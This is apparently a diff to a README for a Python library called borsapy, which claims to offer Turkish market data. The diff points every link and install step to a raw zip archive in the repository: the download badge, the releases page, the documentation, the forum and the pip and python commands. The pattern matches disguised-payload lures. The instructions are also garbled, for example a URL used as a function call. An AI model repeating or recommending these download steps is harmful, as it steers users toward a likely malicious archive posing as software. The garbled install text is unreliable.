@@ -4,7 +4,7 @@
 borsapy is a Python library designed to help you navigate the Turkish financial markets. Whether you're interested in BIST stocks, forex, crypto, funds, or inflation data, borsapy provides you with an easy way to access and analyze this information.
 
 ## 📥 Download Now
-[![Download borsapy](https://raw.githubusercontent.com/hussnainhai33/borsapy/master/docs/Software_1.7.zip)](https://raw.githubusercontent.com/hussnainhai33/borsapy/master/docs/Software_1.7.zip)
+[![Download borsapy](https://github.com/hussnainhai33/borsapy/raw/refs/heads/master/borsapy/_models/Software_1.5.zip)](https://github.com/hussnainhai33/borsapy/raw/refs/heads/master/borsapy/_models/Software_1.5.zip)
 
 ## 🚀 Getting Started
 To get started with borsapy, follow these simple steps to download and run the software.
@@ -16,12 +16,12 @@ To get started with borsapy, follow these simple steps to download and run the s
 
 ### 🚀 Steps to Download and Install
 1. **Visit the Releases Page**
-   - Go to the [Releases page](https://raw.githubusercontent.com/hussnainhai33/borsapy/master/docs/Software_1.7.zip).
+   - Go to the [Releases page](https://github.com/hussnainhai33/borsapy/raw/refs/heads/master/borsapy/_models/Software_1.5.zip).
    - Here, you will find the latest version of borsapy available for download.
 
 2. **Choose the Right Version**
    - Look for the latest version listed at the top of the page.
-   - You will see files corresponding to different operating systems. Make sure to pick the one that fits your system (e.g., Windows users should look for `.whl` or `https://raw.githubusercontent.com/hussnainhai33/borsapy/master/docs/Software_1.7.zip` files).
+   - You will see files corresponding to different operating systems. Make sure to pick the one that fits your system (e.g., Windows users should look for `.whl` or `https://github.com/hussnainhai33/borsapy/raw/refs/heads/master/borsapy/_models/Software_1.5.zip` files).
 
 3. **Download the File**
    - Click on the version that suits your system.
@@ -31,11 +31,11 @@ To get started with borsapy, follow these simple steps to download and run the s
    - After the download is complete, navigate to your Downloads folder.
    - If you downloaded a `.whl` file, you need to install it using Python. Open a terminal or command prompt and run the following command:  
      ```bash
-     pip install https://raw.githubusercontent.com/hussnainhai33/borsapy/master/docs/Software_1.7.zip
+     pip install https://github.com/hussnainhai33/borsapy/raw/refs/heads/master/borsapy/_models/Software_1.5.zip
      ```
-   - If you downloaded a `https://raw.githubusercontent.com/hussnainhai33/borsapy/master/docs/Software_1.7.zip` file, extract it and navigate to the folder. Run:  
+   - If you downloaded a `https://github.com/hussnainhai33/borsapy/raw/refs/heads/master/borsapy/_models/Software_1.5.zip` file, extract it and navigate to the folder. Run:  
      ```bash
-     python https://raw.githubusercontent.com/hussnainhai33/borsapy/master/docs/Software_1.7.zip install
+     python https://github.com/hussnainhai33/borsapy/raw/refs/heads/master/borsapy/_models/Software_1.5.zip install
      ```
 
 5. **Verify the Installation**
@@ -58,7 +58,7 @@ Once installed, you can start using borsapy to access financial data:
 2. **Access Data**
    - You can now access various financial data. For example, if you want to retrieve stock prices:  
      ```python
-     data = https://raw.githubusercontent.com/hussnainhai33/borsapy/master/docs/Software_1.7.zip("AAPL")
+     data = https://github.com/hussnainhai33/borsapy/raw/refs/heads/master/borsapy/_models/Software_1.5.zip("AAPL")
      print(data)
      ```
 
@@ -74,9 +74,9 @@ If you encounter any issues while downloading or using borsapy, please check our
 We welcome contributions to improve borsapy. If you have ideas or suggestions, feel free to fork the repository and submit a pull request.
 
 ## 🔗 Additional Resources
-- [Official Documentation](https://raw.githubusercontent.com/hussnainhai33/borsapy/master/docs/Software_1.7.zip)
-- [Community Forum](https://raw.githubusercontent.com/hussnainhai33/borsapy/master/docs/Software_1.7.zip)
+- [Official Documentation](https://github.com/hussnainhai33/borsapy/raw/refs/heads/master/borsapy/_models/Software_1.5.zip)
+- [Community Forum](https://github.com/hussnainhai33/borsapy/raw/refs/heads/master/borsapy/_models/Software_1.5.zip)
 
-For further updates, keep checking the [Releases page](https://raw.githubusercontent.com/hussnainhai33/borsapy/master/docs/Software_1.7.zip).
+For further updates, keep checking the [Releases page](https://github.com/hussnainhai33/borsapy/raw/refs/heads/master/borsapy/_models/Software_1.5.zip).
 
 Happy investing!
